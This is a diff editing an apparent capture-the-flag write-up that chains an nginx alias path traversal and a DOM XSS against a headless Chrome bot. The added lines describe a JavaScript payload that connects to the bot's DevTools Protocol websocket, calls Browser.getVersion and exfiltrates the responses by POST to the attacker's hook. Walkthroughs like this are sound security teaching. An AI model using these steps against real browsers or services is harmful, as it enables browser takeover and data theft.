@@ -374,7 +374,7 @@ Two seconds later, we receive a callback containing the first flag:
 
 Nice. We got our first flag!
 
-## Chapter 3: Bot Control
+## Chapter 4: Bot Control
 So far, we found two primitives:
 1. A path traversal due to an off-by-slash nginx alias misconfiguration.
 2. A deliverable DOM-based XSS in the app's search functionality
@@ -493,12 +493,22 @@ Now that we have crafted the `devTools` CDP endpoint, let's confirm that we can 
 
 First, we will look at the [CDP documentation](https://chromedevtools.github.io/devtools-protocol/) to see how we can speak with it. I really recommend reading that page.
 
-The CDP protocol is based on web sockets, however it offers few convenience HTTP endpoints such as `/json/version` and `/json/list`.
+The CDP protocol is based on web sockets. It also offers a few convenience HTTP endpoints such as `/json/version` and `/json/list`.
 
-These endpoints are not accessible to us (I tried) due to SOP and CORS preventing us from reading them.
+If we try to access any of the HTTP endpoints, we will notice they are inaccessible to us and we are unable read them due to SOP and CORS.
+
+This confirms that the `--remote-allow-origins=*` flag affects web socket connections only.
+
+Let's try to connect to the web socket endpoint directly then. With some research, we notice that there is two kinds of APIs available us through CDP:
+1. Browser-level
+2. Page-level
+
+> **Note:** Page-level APIs are available if we are connected to a page context such as `/devtools/page/<id>`. However, we got a browser context endpoint `/devtools/browser/<id>` from the `DevToolsActivePort` we read earlier.
+
+We will keep this in mind as we move forward. For now, let's try to call a browser-level method such as [Browser.getVersion](https://chromedevtools.github.io/devtools-protocol/tot/Browser/#method-getVersion)
 
 ![](cdp-browser-getversion.png)
-
+Let's try:
 ```js
 ...
 const ws = new WebSocket(devTools)
@@ -518,6 +528,22 @@ ws.onmessage = async (event) => {
 ...
 ```
 
+This opens up a new WebSocket connection, `onopen`, it sends a JSON-encoded `Browser.getVersion` and will exfiltrate any response back to our hook through POST requests.
 
+Running this payload, we receive this back on our hook:
+```json
+{
+  "id": 1,
+  "result": {
+    "protocolVersion": "1.3",
+    "product": "Chrome/127.0.6533.88",
+    "revision": "@a2d0cb026721e4644e489b8ebb07038ca4e4351c",
+    "userAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/127.0.0.0 Safari/537.36",
+    "jsVersion": "12.7.224.16"
+  }
+}
+```
 
-## Chapter 3: Narrowing In
+Excellent! We can communicate with CDP and get back responses.
+
+Sadly, we can not call methods such as `Page.navigate` yet because, as we said, we are not in a page context. Think we are controlling the browser, not a specific page yet.
